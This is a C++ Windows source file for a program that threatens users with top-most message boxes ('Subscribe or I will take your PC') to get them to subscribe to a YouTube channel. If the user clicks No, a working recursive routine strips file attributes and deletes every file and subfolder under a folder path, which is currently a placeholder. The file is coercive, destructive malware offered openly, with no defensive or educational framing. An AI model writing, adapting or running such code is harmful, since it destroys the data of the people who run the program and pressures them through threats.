#include <windows.h>
#include <Shellapi.h>
#include <string>


using namespace std;

bool DeleteDirectory(const string& refcstrRootDirectory); // function declaration for when the user won't subscribe

int main()
{
	// The message box that tells the user to subscribe
	MessageBox(NULL, "Subscribe to Mr. Utsuho (www.youtube.com/@okuu_utsuho)", "Subscribe or I will take your PC", MB_ICONERROR | MB_SETFOREGROUND | MB_TOPMOST);
	
	// The next message to ask if they will subscribe
	int subsbox = MessageBox(NULL, "Will you subscribe?", "Please?", MB_ICONQUESTION | MB_YESNO | MB_SETFOREGROUND | MB_TOPMOST);
	
	switch (subsbox)
	{
		// If user wants to subscribe by clicking yes, the program will open a browser with the subscribe link
		case IDYES:
			ShellExecute(NULL, "open", "https://www.youtube.com/@okuu_utsuho?sub_confirmation=1", nullptr, nullptr, SW_SHOWNORMAL);
			MessageBox(NULL, "You better do!", "SUBSCRIBE NOW!", MB_ICONWARNING | MB_SETFOREGROUND | MB_TOPMOST);
			
			break;
		
		// If the user refuses to subscribe, this will delete their files (still not final)
		case IDNO:
			
			const char* folderPath = "C:\\Your\\prefered\\folder\\path";
			bool result = DeleteDirectory(folderPath);

    		if (!result) 
			{
        		MessageBox(NULL, "You're not gonna get lucky next time!", "Delete Failed.", MB_ICONERROR | MB_SETFOREGROUND | MB_TOPMOST);
    		}
			else 
			{
        		MessageBox(NULL, "ALL YOUR FILES WILL BE DELETED!", "YOU SHOULDN'T HAVE DONE THAT", MB_ICONERROR | MB_SETFOREGROUND | MB_TOPMOST);
    		}

    	break;
	}
	
	return 0;		
}
	

bool DeleteDirectory(const string& refcstrRootDirectory) // delete function that deletes folder when user won't subscribe
{
    bool bSuccess = false;
    HANDLE hFile; 
    string strFilePath; 
    string strPattern; 
    WIN32_FIND_DATA FileInformation; 

    strPattern = refcstrRootDirectory + "\\*.*";
    hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
    if(hFile != INVALID_HANDLE_VALUE)
    {
        do
        {
            if(FileInformation.cFileName[0] != '.')
            {
                strFilePath.erase();
                strFilePath = refcstrRootDirectory + "\\" + FileInformation.cFileName;

                if(FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    DeleteDirectory(strFilePath);
                }
                else
                {
                    ::SetFileAttributes(strFilePath.c_str(), FILE_ATTRIBUTE_NORMAL);
                    ::DeleteFile(strFilePath.c_str());
                }
            }
        } while(::FindNextFile(hFile, &FileInformation) == TRUE);

        ::FindClose(hFile);

        bSuccess = ::RemoveDirectory(refcstrRootDirectory.c_str());
    }

    return bSuccess;
}

